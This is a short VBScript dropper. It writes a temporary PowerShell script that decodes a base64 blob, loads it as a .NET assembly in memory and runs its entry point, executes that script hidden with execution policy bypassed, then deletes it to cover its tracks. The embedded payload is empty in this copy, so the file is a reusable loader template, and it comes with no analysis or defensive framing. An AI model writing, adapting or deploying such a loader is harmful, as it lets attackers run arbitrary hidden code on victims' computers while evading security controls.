Dim fso, tempFolder, ps1File, shell, script
Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")
tempFolder = shell.ExpandEnvironmentStrings("%TEMP%")
ps1File = tempFolder & "\\load_temp.ps1"

script = "" & vbCrLf & "$base64 = @""" & vbCrLf & "" & vbCrLf & """@.Replace(""`n"", """").Replace(""`r"", """")" & vbCrLf & "$bytes = [System.Convert]::FromBase64String($base64)" & vbCrLf & "$assembly = [System.Reflection.Assembly]::Load($bytes)" & vbCrLf & "$entryPoint = $assembly.EntryPoint" & vbCrLf & "if ($entryPoint) {" & vbCrLf & "    $entryPoint.Invoke($null, @([string[]]@()))" & vbCrLf & "}"

' Create and write to the temp PS1 file
Dim file
Set file = fso.CreateTextFile(ps1File, True)
file.Write(script)
file.Close

' Run the PS1 file silently
shell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File """ & ps1File & """", 0, False

' Optionally delete the PS1 after execution (with a delay)
WScript.Sleep 5000
If fso.FileExists(ps1File) Then fso.DeleteFile(ps1File)
